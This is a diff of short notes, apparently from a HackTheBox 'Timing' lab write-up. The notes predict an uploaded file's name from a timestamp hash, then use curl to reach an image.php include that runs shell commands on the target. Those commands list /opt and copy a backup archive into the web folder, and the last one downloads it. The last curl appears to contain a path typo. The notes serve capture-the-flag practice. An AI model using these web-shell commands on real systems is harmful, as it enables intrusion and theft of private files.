@@ -68,7 +68,12 @@ Thu, 19 Nov 1981 08:52:00 GMT
 
 $file_name = md5('$file_hash' . strtotime("08:52:00"));echo $file_name;
 
+
+ curl 'http://timing.htb/image.php?img=images/uploads/e386dadae01c949d05a461b58477c0af_demo.jpg&cmd=id'
+
+
 curl 'http://timing.htb/image.php?img=images/uploads/e8e77ad06dde9730238b094381525532_demo.jpg&cmd=id'
 curl 'http://timing.htb/image.php?img=images/uploads/e8e77ad06dde9730238b094381525532_demo.jpg&cmd=ls+-la+/opt'
 curl 'http://timing.htb/image.php?img=images/uploads/e8e77ad06dde9730238b094381525532_demo.jpg&cmd=cp+/opt/source-files-backup.zip+/var/www/html/images/uploads/'
 curl 'http://timing.htb/image/php?img=images/uploads/source-files-backup.zip' --output source-files-backup.zip 
+
